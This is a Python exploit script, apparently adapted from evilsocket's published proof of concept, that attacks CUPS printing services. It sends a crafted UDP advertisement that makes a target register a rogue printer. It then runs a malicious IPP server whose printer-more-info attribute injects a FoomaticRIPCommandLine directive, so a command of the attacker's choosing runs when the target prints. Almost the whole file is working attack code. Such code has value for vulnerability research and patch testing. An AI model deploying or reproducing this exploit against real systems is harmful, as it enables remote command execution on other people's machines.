# This original script was from evilsocket. I will indicate where I have made changes to the code - The 2xdropout
# Please Check the README file for links to evilsocket's github page and writeup

import socket
import threading
import time
import sys


from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest


class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in this class
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def minimal_attributes(self):
        return {
            # This list comes from
            # [https://tools.ietf.org/html/rfc2911]
            # Section 3.1.4.2 Response Operation Attributes
            (
                SectionEnum.operation,
                b'attributes-charset',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.operation,
                b'attributes-natural-language',
                TagEnum.natural_language
            ): [b'en'],
        }

    def printer_list_attributes(self):   # The 2xdropout was in this function
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'Main Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Main Printer Info'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP 0.00'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()], # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job, # (required by cups)
                    OperationEnum.validate_job, # (required by cups)
                    OperationEnum.cancel_job, # (required by cups)
                    OperationEnum.get_job_attributes, # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],  # The 2xdropout was in this block
        }
        attr.update(super().minimal_attributes())
        return attr

    def operation_printer_list_response(self, req, _psfile):   # The 2xdropout was in this function
        print(f'\033[31m[EvilPrinter]\033[37m Target Connected, Sending Payload')
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes
        )


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printerName, printerLocation, printerInfo):   # The 2xdropout was in this function
    print(f'\033[31m[EvilPrinter]\033[37m Sending UDP Packet To Target:  {ip}:{port}')

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/{printerName}'
    printer_model = 'Cannon TS6420a'
    message = f'{printer_type} {printer_state} {printer_uri} {printerLocation} {printerInfo} {printer_model} \n'

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode('utf-8'), (ip, port))


def wait_until_ctrl_c():
    try:
        while True:
            time.sleep(300)
    except KeyboardInterrupt:
        return


def run_server(server):
    print(f'\033[31m[EvilPrinter]\033[37m Malicious IPP Server Listening On {server.server_address}')   # The 2xdropout was on this line
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    wait_until_ctrl_c()
    server.shutdown()


def launch(RHOST, RPORT, SVRHOST, SVRPORT, printerName, printerLocation, printerInfo, command):   # The 2xdropout was in this function

    server = IPPServer((SVRHOST, SVRPORT), IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    send_browsed_packet(RHOST, RPORT, SVRHOST, SVRPORT, printerName, printerLocation, printerInfo)

    print(f'\033[31m[EvilPrinter]\033[37m Waiting...')

    while True:
        time.sleep(1.0)
